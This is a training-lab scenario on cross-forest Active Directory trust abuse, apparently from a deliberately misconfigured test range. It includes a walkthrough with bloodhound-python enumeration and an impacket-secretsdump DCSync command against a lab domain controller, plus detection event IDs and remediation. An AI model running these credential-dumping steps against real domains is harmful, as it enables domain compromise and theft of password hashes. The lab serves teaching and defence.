# Scenario 6 - Cross-Forest Trust Abuse

| | |
|---|---|
| **MITRE ATT&CK** | T1134.005 - Access Token Manipulation: SID-History Injection |
| **Toggle** | `misconfig.trust_abuse` |
| **Role** | `misconfig_trust_abuse` (trust itself built by `ad_trust`) |
| **Forests** | `corp.contoso.lab` (CORP) <-> `partner.fabrikam.lab` (PARTNER) |
| **Foothold** | `vendor_svc` in the PARTNER forest |

## Objective

Use a principal from the partner forest to reach a privileged group in the
primary forest over the bidirectional forest trust — and understand why SID
filtering matters.

## Seeded configuration

- A bidirectional **forest trust** between CORP and PARTNER, with SID history
  enabled (`ad_trust`, tag `trust`).
- `vendor_svc`, a user in `partner.fabrikam.lab`, is added to the **CORP
  `Backup-Operators`** group as a foreign security principal.

That membership is a genuine cross-forest edge: compromising `vendor_svc` in
PARTNER grants Backup-Operators in CORP, which can be leveraged for DCSync-style
attacks (Backup Operators can replicate with the right rights).

## Attack walkthrough

```bash
# 1. Recover vendor_svc's password (weak service password, scenario 1/2
#    techniques), or use any PARTNER foothold.
# 2. From the Kali box with VPN access, authenticate to PARTNER and enumerate
#    what the account can reach across the trust.
bloodhound-python -u vendor_svc -p '<password>' -d partner.fabrikam.lab \
  -ns 10.10.10.10 -c All

# 3. Identify CORP groups the foreign principal is a member of, then act on
#    Backup-Operators (e.g. via secretsdump against a DC with backup rights).
impacket-secretsdump -just-dc 'corp.contoso.lab/vendor_svc:<password>'@10.10.10.10
```

### BloodHound view

The engine surfaces `TrustedBy` edges between domain nodes and the foreign
group membership that bridges the forests.

## Detection

- **4624** logon type 3 with a foreign domain SID and access to CORP resources.
- **4662** replication-rights abuse on the domain NC (DCSync).
- Directory changes: unexpected `Backup-Operators` membership with a foreign SID.

## Remediation

- Keep **SID filtering** enabled on external/forest trusts (the lab deliberately
  leaves the abuse path visible; production should quarantine SIDs).
- Do not add foreign principals to privileged groups; use dedicated,
  audited cross-forest access with least privilege.
- Regularly review `Get-ADGroupMember` for foreign SIDs and trust
  configuration with `Get-ADTrust -Filter *`.

## References

- MITRE T1134.005
- Microsoft: "SID filtering and forest trusts"
